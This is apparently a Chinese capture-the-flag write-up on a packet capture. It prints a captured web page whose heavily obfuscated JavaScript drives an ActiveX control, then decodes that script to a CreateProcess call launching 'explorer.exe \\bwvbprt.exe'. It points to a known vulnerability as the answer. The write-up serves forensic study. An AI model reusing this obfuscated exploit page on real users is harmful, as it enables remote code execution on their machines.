首先Follow TCP Stream可得：

```
GET /%60Ix%2bcfp.asp HTTP/1.1
Host: jcOm
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
Accept: */*
Connection: keep-alive
Content-Length: 0

HTTP/1.1 200 OK
Date: Tue, 03 Mar 2015 10:29:43 GMT
Server: Microsoft-IIS/6.0
Host: jcOm
Last-Modified: Tue, 03 Mar 2015 10:29:30 GMT
Accept-Ranges: bytes
Content-Length: 2132
Connection: close
Content-Type: text/html

<html>
<body>
<object id="mfHQh" classid="clsid:5C2A52BD-2250-4F6B-A4D2-D1D00FCD748C">
<script type="text/javascript">
mfHQh[(unescape(String.fromCharCode((67E0000>>(0>>((0)>>(0)))), 114, (101), ((58914458, 85)+parseInt("110", 3)), (("cGyfp"<289)?("Fy"):11.6e+0001), (202>>(("BfbZkWS"==327)?unescape("lxt"):1)), 80))+(942).toString(34e00)+((12).toString(34)+(14).toString(34E00000)+"s"+(28).toString(((29E+00000<<("OTUpu", 44064652, "Qd", "eRA", "fEgAwtJ", 9362486, 675682, "LLxSXd", 0))<<(0)))))](unescape((("iYbgcQD"<="ZDJbgwjxH")?(981<<(-~-0-1)):(("wVJTgSZum"!=73171390)?String.fromCharCode(99E0000, ((74>>(-~1-1))<<(("qInlSEQAC"!=1971649)?0:715912)), (51E+00000<<0), (((1023==22)?27051:(-~65-1))<<(0>>0)), parseInt("25", 16), ((((~~53)>>(0)))^(-1)+1), ((67E+000<<0)<<0), (~~(~~11.9E+001)), 105E+00000, ("", unescape("OnY"), 110), (((49662263==963834)?"EvBDfGnk":223)-(123>>(0))), (-~11.1E1-1), (((119)^(-1)+1)<<parseInt("0", 2)), ((115<<((0)>>(0)))>>((0)>>(0))), 37, (-~(("qIGAZWko", 53)<<(0))-1), 67e+00, ((959854528>="VUsUeDs")?"GfR".split("").reverse().join(""):101), ((-~((1<<6)+56)-1)<<(656218, 0)), (448>>("knoVd", "", 2)), ((267>>(0))-(-(-159))), ((444>>2)>>(0)), (("UtmHWsEw"!=825704629)?(456e00>>(1<<1)):unescape("Ip")), 101, ((57E00<<0)<<1), (-~((92>>(0))>>(178263, 6994229, 1))-1), (-~101-1), (~~12.0E001), (-(-(~~(("ZmSlaRt"<2448443)?"SIhD":101)))), 32, (((((37>>(0)))^(-1)+1))^(-1)+1), ((53E0000>>0)>>0), ((("icuMppvs"<897081)?45063:((3295257<67659)?957:67))<<0), (-(-(-~37-1))), (((70025<="cJecgz")?"MPLoegx":(-34))+(174>>1)), 67, (49e+00<<parseInt("1", 15)), ((13<<1)+(42975201, "ymv", "", "", 93)), (236>>(("TgKX"<29845901)?454:((3190<="MQfOBSc")?"Dmjel":1))), (98), 112, ("zyEZT".split("").reverse().join(""), 682149, 114), (((232)>>((49>"qBaCavK")?83:1))<<(-~-0-1)), (46), ((351!=82)?10.1E00001:parseInt("24259", 26)), ((48.0E01>>(1<<1))>>((-(("oA"<"Sr")?"onxYT":(0)))^(-1)+1)), (101)):(String.fromCharCode((("jDwp", 109)<<(0)))+"q"+"i")))),0,(((-(-(String.fromCharCode(((1208>="VvPPHwIKa")?353:106), ((4246239<"BtojuE")?309609:70)), parseInt("1610455013", 7), 1)))>>0)>>0));
</script>
</body>
</html>
```

关注中间的js，直接执行是执行不了的，因为那个mfHQh不知道是啥，于是乎，注意将整个js按照语法逻辑分块执行替换掉，会发现程序变成了：

```js
mfHQh["CreateProcess"]("c:\windows\explorer.exe \\bwvbprt.exe", 0, 1)
```

然后Google `\\bwvbprt.exe`很容易就可以搜到这个[漏洞](http://sebug.net/vuldb/ssvid-62171)，提交CVE ID即可。
